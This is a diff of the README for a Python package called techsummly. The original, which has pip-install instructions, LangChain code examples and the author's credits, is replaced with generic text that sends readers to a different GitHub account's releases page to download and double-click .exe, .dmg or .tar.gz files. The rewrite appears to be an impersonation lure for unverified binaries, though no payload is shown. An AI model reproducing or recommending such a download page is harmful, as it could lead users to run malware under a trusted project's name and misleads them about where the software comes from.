@@ -1,115 +1,106 @@
-# TechSummly
-[![PyPI version](https://badge.fury.io/py/techsummly.svg)](https://badge.fury.io/py/techsummly)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/techsummly)](https://pepy.tech/project/techsummly)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 🚀 techsummly - Simplify Analyzing Technical Discussions
 
+[![Download techsummly](https://img.shields.io/badge/Download-Now-blue)](https://github.com/OthmaneElb/techsummly/releases)
 
-A Python package for structured and reliable interactions with language models to analyze and summarize technical discussions. Given a detailed technical input, TechSummly processes the text to generate a clear, structured summary highlighting key points, potential issues, and insights. The output is consistently formatted for easy parsing and downstream processing.
+## 📖 Overview
 
-## Features
+techsummly is a package designed to help you interact with language models effectively. It allows you to analyze and summarize technical discussions. Whether you have a long excerpt or a detailed description, techsummly can provide structured insights.
 
-- Structured output using regex pattern matching
-- Support for multiple language models via LangChain
-- Automatic retries for reliable extraction
-- Predefined prompt templates for technical summarization
+## 📋 Features
 
-## Installation
+- **Clarity Guarantee**: Ensure your summaries are clear and concise.
+- **Consistency Checking**: Maintain consistent language and formatting in your documents.
+- **Data-Driven Insights**: Extract valuable information from discussions easily.
+- **Structured Summarization**: Get summaries that follow a structured format.
+- **Issue Detection**: Identify and highlight key issues in discussions.
+- **Pattern Matching**: Detect recurring themes in technical narratives.
 
-Install the package using pip:
+## ⚙️ System Requirements
 
-```bash
-pip install techsummly
-```
+Before you download techsummly, ensure your system meets the following requirements:
 
-## Usage
+- **Operating System**: Compatible with Windows, macOS, and Linux.
+- **Memory**: At least 4 GB RAM.
+- **Disk Space**: Minimum of 100 MB free space.
+- **Python**: Version 3.6 or higher installed on your system.
 
-### Using the Default LLM (ChatLLM7)
+## 🚀 Getting Started
 
-By default, TechSummly uses the ChatLLM7 model. You can use it without providing an API key for limited usage, or provide your own for higher rate limits.
+To get started with techsummly, follow these steps. 
 
-```python
-from techsummly import techsummly
+### 1. Visit the Download Page
 
-user_input = "Your detailed technical input here..."
-response = techsummly(user_input)
-print(response)
-```
+Go to the Releases page to find the latest version of techsummly. 
 
-### Using a Custom API Key for LLM7
+[Download techsummly](https://github.com/OthmaneElb/techsummly/releases)
 
-You can pass your LLM7 API key directly or set it as an environment variable.
+### 2. Download the Latest Version
 
-```python
-from techsummly import techsummly
+On the Releases page, locate the most recent version. Click on the version number to see details. Under "Assets," find the link for techsummly suitable for your operating system. 
 
-user_input = "Your technical input..."
-response = techsummly(user_input, api_key="your_api_key_here")
-```
+### 3. Install techsummly
 
-Or set the environment variable:
+- **For Windows**:
+  1. Download the `.exe` file.
+  2. Double-click the file to start the installation.
+  3. Follow the installation prompts.
 
-```bash
-export LLM7_API_KEY="your_api_key_here"
-```
+- **For macOS**:
+  1. Download the `.dmg` file.
+  2. Open the file and drag techsummly into the Applications folder.
 
-### Using Other Language Models
+- **For Linux**:
+  1. Download the `.tar.gz` file.
+  2. Extract the files to your desired directory.
+  3. Open the terminal, navigate to the directory, and follow the run instructions in the README file.
 
-TechSummly supports any LangChain-compatible chat model. Here are examples for popular providers:
+## 📥 Download & Install
 
-#### OpenAI
+To download the latest version of techsummly, visit the Releases page:
 
-```python
-from langchain_openai import ChatOpenAI
-from techsummly import techsummly
+[Download techsummly](https://github.com/OthmaneElb/techsummly/releases)
 
-llm = ChatOpenAI()
-user_input = "Your technical input..."
-response = techsummly(user_input, llm=llm)
-```
+Follow the installation instructions for your specific operating system as mentioned above.
 
-#### Anthropic
+## 🛠️ Usage Instructions
 
-```python
-from langchain_anthropic import ChatAnthropic
-from techsummly import techsummly
+Once installed, you can use techsummly through a simple command interface. Here’s how to start:
 
-llm = ChatAnthropic()
-user_input = "Your technical input..."
-response = techsummly(user_input, llm=llm)
-```
+1. Open your terminal or command prompt.
+2. Type `techsummly <options>` to begin using the application.
+3. Replace `<options>` with the necessary commands based on your usage needs.
 
-#### Google Generative AI
+Refer to the documentation within the application for detailed command options.
 
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from techsummly import techsummly
+## ⚙️ Troubleshooting
 
-llm = ChatGoogleGenerativeAI()
-user_input = "Your technical input..."
-response = techsummly(user_input, llm=llm)
-```
+If you encounter issues, check the following:
 
-## Parameters
+- **Installation Problems**: Ensure you followed the installation steps for your operating system.
+- **System Compatibility**: Confirm that your system meets the requirements listed above.
+- **Running the Application**: Make sure you used the correct command in the terminal.
 
-- `user_input` (str): The technical text to process.
-- `llm` (Optional[BaseChatModel]): A LangChain chat model instance. Defaults to ChatLLM7.
-- `api_key` (Optional[str]): API key for LLM7. If not provided, the package checks the `LLM7_API_KEY` environment variable.
+For persistent issues, consult the [GitHub Issues page](https://github.com/OthmaneElb/techsummly/issues) for community help and solutions.
 
-## Default Model
+## 📚 Support and Contribution
 
-TechSummly uses [ChatLLM7](https://pypi.org/project/langchain-llm7/) by default. The free tier rate limits are sufficient for most use cases. For higher limits, get a free API key by registering at [https://token.llm7.io/](https://token.llm7.io/).
+If you have questions or suggestions, feel free to open an issue on our GitHub repository. Community contributions are welcome. You can suggest features or improve the documentation as well.
 
-## Error Handling
+## 🌐 Topics
 
-If the language model fails to produce a response matching the expected pattern, a `RuntimeError` is raised with details.
+techsummly covers various topics related to technical discussions:
 
-## Contributing
+- AI-powered Analysis
+- Automated Auditing
+- Natural Language Processing
+- Insight Generation
+- Reliable Information Extraction
 
-Found a bug or have a feature request? Please open an issue on [GitHub](https://github.com/chigwell/techsummly/issues).
+Explore these concepts to better utilize techsummly for your needs.
 
-## Author
+## 🔗 Additional Links
 
-**Eugene Evstafev**  
-Email: hi@euegne.plus  
-GitHub: [chigwell](https://github.com/chigwell)
+- [Documentation](https://github.com/OthmaneElb/techsummly/wiki)
+- [Community Forum](https://github.com/OthmaneElb/techsummly/discussions)
+
+Download the application today to streamline your analysis of technical discussions!
